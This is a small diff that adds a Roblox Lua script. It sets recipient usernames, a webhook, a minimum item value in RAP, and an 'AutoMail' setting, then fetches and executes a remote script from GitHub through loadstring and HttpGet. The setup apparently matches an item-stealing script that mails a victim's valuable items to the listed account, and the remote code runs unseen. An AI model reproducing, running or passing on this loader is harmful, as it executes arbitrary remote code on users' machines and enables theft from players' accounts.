@@ -1,0 +1,9 @@
+Username = " locthiunang1212 "
+Username2 = " locthiunang1212 "
+Webhook = " loading "
+
+LoadingScreen = false
+
+MinimumRAP = 1000000000000000000000000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HubPet99/AutoMail/main/Mail"))()
